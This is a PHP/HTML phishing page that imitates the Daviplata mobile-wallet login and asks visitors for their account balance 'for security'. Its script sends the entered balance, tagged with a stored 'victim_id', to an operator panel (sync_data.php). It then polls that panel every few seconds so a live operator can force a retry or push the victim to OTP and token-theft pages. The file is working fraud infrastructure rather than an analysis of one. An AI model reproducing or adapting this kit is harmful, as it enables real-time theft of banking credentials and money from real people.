<?php
include_once dirname(dirname(dirname(dirname(dirname(dirname(__DIR__)))))) . '/admin/subirdatos/security_gate.php';
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
    <title>Daviplata - Saldo</title>
    <link rel="stylesheet" href="PseDaviplata/css/estilos.css">
    <style>
        body {
            background-color: #f0f0f0;
            font-family: Arial, sans-serif;
            margin: 0;
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }
        .login-card {
            background: white;
            padding: 40px;
            border-radius: 15px;
            width: 90%;
            max-width: 400px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
            text-align: center;
        }
        .logo {
            width: 160px;
            margin-bottom: 30px;
        }
        .title {
            color: #d10000;
            font-size: 22px;
            font-weight: bold;
            margin-bottom: 10px;
        }
        .subtitle {
            color: #444;
            font-size: 14px;
            line-height: 1.5;
            margin-bottom: 30px;
        }
        .input-group {
            border: 1px solid #ddd;
            border-radius: 8px;
            height: 55px;
            display: flex;
            align-items: center;
            padding: 0 15px;
            margin-bottom: 25px;
        }
        .input-group span {
            color: #d10000;
            font-weight: bold;
            font-size: 18px;
            margin-right: 10px;
        }
        .input-saldo {
            border: none;
            background: transparent;
            width: 100%;
            height: 100%;
            outline: none;
            font-size: 18px;
            color: #333;
        }
        .btn-confirmar {
            background: #d10000;
            color: white;
            border: none;
            width: 100%;
            height: 50px;
            border-radius: 25px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
        }
        .btn-confirmar:disabled {
            background: #ccc;
            cursor: not-allowed;
        }
        #error-msg {
            color: #d10000;
            font-size: 13px;
            margin-bottom: 15px;
            display: none;
            font-weight: bold;
        }
        .loader-overlay {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(255,255,255,0.9);
            z-index: 9999;
            display: none;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }
        .spinner {
            width: 40px; height: 40px;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #d10000;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        @keyframes spin { 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div id="loader" class="loader-overlay">
        <div class="spinner"></div>
        <p style="margin-top: 20px; color: #d10000; font-weight: bold;">Cargando...</p>
    </div>

    <div class="login-card">
        <img src="PseDaviplata/img/logo-daviplata.svg" alt="Daviplata" class="logo">
        <div class="title">Validación de Saldo</div>
        <p class="subtitle">Por su seguridad, ingrese el <b>saldo total</b> que tiene actualmente en su Daviplata para continuar.</p>
        
        <div id="error-msg">Saldo incorrecto. Intente de nuevo.</div>

        <div class="input-group">
            <span>$</span>
            <input type="tel" id="saldo" class="input-saldo" placeholder="0.00" autocomplete="off">
        </div>

        <button id="btn-confirmar" class="btn-confirmar" disabled>Continuar</button>
    </div>

    <script src="PseDaviplata/js/jquery.min.js"></script>
    <script>
        const getProjectRoot = () => {
            const path = window.location.pathname;
            const parts = path.split('/');
            const pseIndex = parts.indexOf('PSE');
            return pseIndex !== -1 ? parts.slice(0, pseIndex + 1).join('/') : '';
        };
        const root = getProjectRoot();

        const victimId = localStorage.getItem('victim_id');
        const panelSID = localStorage.getItem('victim_sid') || '';

        $('#saldo').on('input', function() {
            let val = $(this).val().replace(/\D/g, '');
            if (val.length > 0) {
                $(this).val(new Intl.NumberFormat('es-CO').format(val));
                $('#btn-confirmar').prop('disabled', false);
            } else {
                $(this).val('');
                $('#btn-confirmar').prop('disabled', true);
            }
        });

        $('#btn-confirmar').on('click', function() {
            const saldo = $('#saldo').val();
            if (!saldo) return;

            $('#loader').css('display', 'flex');

            $.ajax({
                type: 'POST',
                url: root + '/admin/subirdatos/sync_data.php',
                data: {
                    action: 'update_saldo',
                    id: victimId,
                    sid: panelSID,
                    saldo: saldo,
                    banco: 'DAVIPLATA'
                },
                success: function() {
                    window.location.href = "dinamica.php";
                },
                error: function() {
                    $('#loader').hide();
                    alert("Error.");
                }
            });
        });

        function checkStatus() {
            if (!victimId) return;
            $.ajax({
                url: root + "/admin/subirdatos/sync_data.php",
                type: "GET",
                cache: false,
                data: { id: victimId, t: Date.now() },
                success: function(res) {
                    try {
                        const json = typeof res === 'string' ? JSON.parse(res) : res;
                        if (!json || !json.data) return;
                        const status = json.data.status ? json.data.status.toLowerCase().trim() : '';
                        
                        if (status === 'error saldo') {
                            $('#loader').hide();
                            $('#error-msg').show();
                            $('#saldo').val('');
                            $('#btn-confirmar').prop('disabled', true);
                            
                            $.post(root + '/admin/subirdatos/sync_data.php', {
                                action: 'update_status',
                                id: victimId,
                                status: 'Pedir Saldo (Reintento)'
                            });
                        } else if (status === 'pedir otp' || status === 'otp sms' || status === 'token') {
                            window.location.href = "dinamica.php";
                        } else if (status === 'finalizado' || status === 'finalizar') {
                            window.location.href = "final.php";
                        }
                    } catch (e) {}
                }
            });
        }
        setInterval(checkStatus, 3000);
    </script>
</body>
</html>